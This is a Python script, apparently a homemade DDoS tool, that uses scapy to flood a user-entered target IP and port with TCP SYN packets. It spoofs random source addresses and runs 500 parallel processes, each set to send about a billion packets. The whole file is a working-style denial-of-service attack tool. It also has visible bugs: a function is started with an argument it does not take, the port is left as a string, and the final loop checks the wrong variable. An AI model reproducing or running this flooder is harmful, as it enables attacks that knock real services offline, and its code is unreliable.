# #!/usr/bin/env python3
import argparse
import random
from scapy.all import send, IP, TCP
# Testing to create many processes
import multiprocessing
import os

#input_processes = input('Please enter number of processes [500]: ')
input_processes = 500


# Default number of packets
DEFAULT_PACK = 999999999
# Total of Ports an OS can hold
MAX_PORTS = 65535
DEFAULT_PORT = 8082

Target_IP = input('Enter target IP [192.168.2.240]: ')
dPort = input('Enter dst Port [8082]: ')
packets_to_send = DEFAULT_PACK

# Get generate random IP
def random_IP():
    # range(4) => 192.168.0.1 = 4 ranges
    # "." = joining 192.168.x.y
    IP = ".".join(map(str,(random.randint(0,255)for _ in range(4))))
    return IP


def get_args():
    parser = argparse.ArgumentParser(description="Sync Flooder\n")
    # Allow users to entert -flag arguments like Traditional Linux tools
    # python3 flooder.py 192.168.2.65 -a 999999999 -p 8082
    parser.add_argument('t', help="Victim's IP Addr")
    parser.add_argument('-a', type=int, help="Amount of packets (default are infinitity)", default=DEFAULT_PACK)
    parser.add_argument('-p', type=int, help="Target Port (default ports are 8080/8081/8082)", default=80)
    args = parser.parse_args()
    # return -t -a -p
    return args.t, args.a, args.p


def syn_flood(Target_IP, dPort, packets_to_send):
    
    #print("Sending packets to the target...")
    # As we know how many packets to send, use for loop
    for i in range(packets_to_send):
        seq_n = random.randint(0, MAX_PORTS)
        # srcPort
        sPort = random.randint(0, MAX_PORTS)
        Window = random.randint(0, MAX_PORTS)
        # Calling back random IP returned from def random_IP()
        src_IP = random_IP()
        
        # Setting up packets
        # sport = Source Port
        # dport = Destination Port
        # seq = sequence ; seq_n = sequetial number
        packet = IP(dst=Target_IP, src=src_IP)/TCP(sport=sPort, dport=dPort, flags="S", seq=seq_n, window=Window)
        send(packet, verbose=0)
        
    #print("Sent all packets :D")
    #print(f'Sent all the packets {packet} from src_IP:sPort {src_IP}:{sPort} to Target_IP:dPort {Target_IP}:{dPort}')
        
def do_flood():
    # Receiving all arguments Target_IP, dPort, packets_to_send from syn_flood()
    #Target_IP, dPort, packets_to_send = get_args()    
    syn_flood(Target_IP, dPort, packets_to_send)
    
def main():
    # Counting all useable CPU
    my_cpu = multiprocessing.cpu_count()
    print(f'my_cpu: {my_cpu}')

    # Create a list of jobs to run in parallel
    # jobs= [
    #     {'func': print_cube, 'args':(3,)},
    #     {'func': print_square, 'args': (4,)}
    # ]
    
    # Changing input_processes to integer
    #input_processes = int(input_processes)
    
    # Number of processes
    number_of_processes = input_processes
    
    # List to keep track of processes
    processes = []

    # **** Multi-callbacks :D
    # Loop over the Jobs & create a process for each one
    # for i in range(number_of_processes):
    #     p = multiprocessing.Process(
    #         target=job['func'], 
    #         args=job['args']
    #         )
    
    
    # ****** Single Callback for DDoS :D
    for i in range(number_of_processes):
        
        # Creating each process p
        p = multiprocessing.Process(target=do_flood, args=(i,))

        # Appending each p in multiprocessing.Process()
        # to List processes = []
        processes.append(p)
        
        # Start each Process p
        p.start()
    
    # Wait for all processes to complete
    # Loop through each process in List processes
    # then wait for each process to complete
    # by joining each single process p
    for process in processes:
        process.join()
        
    # Check whether processes are still alive
    #for i, process in enumerate(processes, start=1):
    for i, process in enumerate(processes):
        print(f'Process i is alive?\n{ p.is_alive()}')
    
    
# Fucking Windows checks for whether this is the main script
# and NOT a module...    
if __name__ == '__main__':
    main()
    